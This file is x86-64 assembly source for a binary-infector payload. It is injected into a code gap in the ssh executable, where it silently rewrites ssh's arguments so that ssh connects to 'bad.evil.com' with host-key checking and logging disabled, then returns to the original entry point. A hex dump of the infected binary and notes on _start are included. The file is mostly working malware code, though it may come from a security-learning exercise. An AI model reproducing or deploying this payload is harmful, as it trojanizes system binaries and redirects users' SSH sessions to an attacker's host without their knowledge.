.intel_syntax noprefix

#This call/pop trick is a common assembly idiom to obtain the current instruction pointer (RIP) because the return address of the call (i.e., the address immediately after the call) is automatically pushed onto #the stack and then popped into a register (in this case, rbx).
PING:
	#; this is why the SHORTCALLZ is used in the infector.c - gap_offset will be moved forward by this 5-byte instruction
	call short PONG  	
PONG:
	#; get rip (gap_offset after 5-byte call from above) - call above is a clever way to grab rip
	pop rbx

	#; get base
	mov rbp, rsp
	
	#; set up strings
	#; ssh -o StrickHostKeyChecking=no bad.evil.com
	
	mov rdi, 0x000000006d6f632e	#; .com\0
	push rdi
	mov rdi, 0x6c6976652e646162	#; bad.evil
	push rdi
	lea rdi, [rsp]	

	xor rcx, rcx			#; \0
	push rcx
	mov rsi, 0x6f6e3d676e696b63	#; cking=no
	push rsi
	mov rsi, 0x65684379654b7473	#; stKeyChe
	push rsi
	mov rsi, 0x6f48746369727453	#; StrictHo
	push rsi
	lea rsi, [rsp]
	
	mov r8, 0x00000000000006f2d	#; -o\0
	push r8
	lea r8, [rsp]

	mov r9, 0x0000524f5252453d	#; =ERROR\0
	push r9
	mov r9, 0x6c6576654c676f4c	#; LogLevel
	push r9
	lea r9, [rsp]

	mov r10, 0x000000006c6c756e	#; null\0
	push r10
	mov r10, 0x2f7665642f3d656c	#; le=/dev/
	push r10
	mov r10, 0x69467374736f486e	#; nHostsFi
	push r10
	mov r10, 0x776f6e4b72657355	#; UserKnow
	push r10
	lea r10, [rsp]

	#; setup env
	push rcx			#; NULL
	#; setup argv
	push rcx			#; NULL
	push rdi			#; [7] = "bad.evil.com"
	push rsi			#; [6] = "StrictHostKeyChecking=no" 
	push r8				#; [5] = "-o" 
	push r10			#; [4] = "UserKnownHostFile=/dev/null"
	push r8				#; [3] = "-o"
	push r9				#; [2] = "LogLevel=ERROR"
	push r8				#; [1] = "-o"
	mov rsi, [rbp + 0x8]
	push rsi			#; [0] = "ssh"
	#; setup argc
	mov rdi, 0x8		
	push rdi			#; number of items in argv array	
	
END:
	#; get original entry ptr
	mov rcx, 0x4141414141414141	#; placeholder for infector.c to find/replace with offset needed to get back to original entry
	add rbx, rcx			#; rbx = 0x7369a + (-0x62baa) == 0x10af0			
					#; jmp rbx - will fail on a 64-bit system (near, relative - not valid)
	#; goto original
	push rbx			#; 0x10af0 (original/old entry offset) - push this offset to stack as rip for the ret below 
	ret				

#; xxd -s +0x73695 ssh | less == output of the ssh program AFTER infection (0x73695 == 'gap_offset' in infector.c)
#; 00073695: e800 0000 005b 4889 e548 c7c7 2e63 6f6d  .....[H..H...com
#; 000736a5: 5748 bf62 6164 2e65 7669 6c57 488d 3c24  WH.bad.evilWH.<$
#; 000736b5: 4831 c951 48be 636b 696e 673d 6e6f 5648  H1.QH.cking=noVH
#; 000736c5: be73 744b 6579 4368 6556 48be 5374 7269  .stKeyCheVH.Stri
#; 000736d5: 6374 486f 5648 8d34 2449 c7c0 2d6f 0000  ctHoVH.4$I..-o..
#; 000736e5: 4150 4c8d 0424 49b9 3d45 5252 4f52 0000  APL..$I.=ERROR..
#; 000736f5: 4151 49b9 4c6f 674c 6576 656c 4151 4c8d  AQI.LogLevelAQL.
#; 00073705: 0c24 49c7 c26e 756c 6c41 5249 ba6c 653d  .$I..nullARI.le=
#; 00073715: 2f64 6576 2f41 5249 ba6e 486f 7374 7346  /dev/ARI.nHostsF
#; 00073725: 6941 5249 ba55 7365 724b 6e6f 7741 524c  iARI.UserKnowARL
#; 00073735: 8d14 2451 5157 5641 5041 5241 5041 5141  ..$QQWVAPARAPAQA
#; 00073745: 5048 8b75 0856 48c7 c708 0000 0057 48b9  PH.u.VH......WH.	48 b9	  mov rcx, 56d4 f9ff ffff ffff (4141 4141 4141 4141) 
#; 00073755: 56d4 f9ff ffff ffff 4801 cb53 c300 0000  V.......H..S....	48 01 cb  add rbx, rcx 	            replaced by infector ^^
								    #;	53 c3 	  push rbx; ret


#; When writing Entry, look at how __libc_start_main is called, and it's arguments
#; There are varied versions and arguments, but it can help us understand what needs to be where when we call the real entry
	
#; an example anotated start:
#;_start
#;  401040:       f3 0f 1e fa             endbr64 
#;  401044:       31 ed                   xor    %ebp,%ebp			== clean ebp
#;  401046:       49 89 d1                mov    %rdx,%r9			== rtld_fini
#;  401049:       5e                      pop    %rsi				== argc
#;  40104a:       48 89 e2                mov    %rsp,%rdx			== ubp_av
#;  40104d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp	== align stack
#;  401051:       50                      push   %rax				== someglobal
#;  401052:       54                      push   %rsp				== stackend
#;  401053:       49 c7 c0 d0 11 40 00    mov    $0x4011d0,%r8			== __libc_csu_fini
#;  40105a:       48 c7 c1 60 11 40 00    mov    $0x401160,%rcx			== __libc_csu_init
#;  401061:       48 c7 c7 26 11 40 00    mov    $0x401126,%rdi			== main
#;  401068:       ff 15 82 2f 00 00       callq  *0x2f82(%rip)
